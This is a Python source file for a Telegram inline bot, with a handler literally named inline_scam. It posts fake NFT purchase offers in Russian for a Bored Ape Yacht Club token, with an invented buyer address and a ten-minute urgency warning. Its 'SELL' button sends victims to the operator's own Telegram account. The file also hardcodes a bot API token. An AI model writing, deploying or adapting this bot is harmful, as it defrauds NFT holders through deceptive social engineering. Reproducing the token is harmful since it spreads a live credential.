import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import (
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.utils import executor

BOT_TOKEN = "9265955382:AAHCc8g_U3l9MeKJDqOdwbL7xTf9kdt9YmU"
YOUR_ACCOUNT = "Fodug"
NFT_IMAGE_URL = "https://i.ibb.co/6P0Z8sV/nft.jpg"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

@dp.inline_handler()
async def inline_scam(inline_query: types.InlineQuery):
    query_text = inline_query.query.strip()
    
    if not query_text:
        await bot.answer_inline_query(inline_query.id, [], cache_time=1)
        return

    price = query_text.upper()
    
    text = (
        "🎨 **Вам поступило предложение!**\n\n"
        "Коллекция: Bored Ape Yacht Club #4321\n"
        f"Цена: **{price}**\n"
        "Покупатель: 0x71C...4A2\n\n"
        "⚠️ Предложение действует 10 минут.\n"
        "Нажмите «ПРОДАТЬ», чтобы подтвердить сделку."
    )

    keyboard = InlineKeyboardMarkup()
    btn_sell = InlineKeyboardButton(
        text=f"💰 ПРОДАТЬ ЗА {price}",
        url="https://t.me/" + YOUR_ACCOUNT
    )
    keyboard.add(btn_sell)

    result = InlineQueryResultArticle(
        id="1",
        title=f"NFT Offer — {price}",
        description="Отправить оффер",
        thumb_url=NFT_IMAGE_URL,
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode="Markdown"
        ),
        reply_markup=keyboard
    )

    await bot.answer_inline_query(inline_query.id, [result], cache_time=1)

if __name__ == "__main__":
    print("[+] Бот запущен")
    executor.start_polling(dp, skip_updates=True)
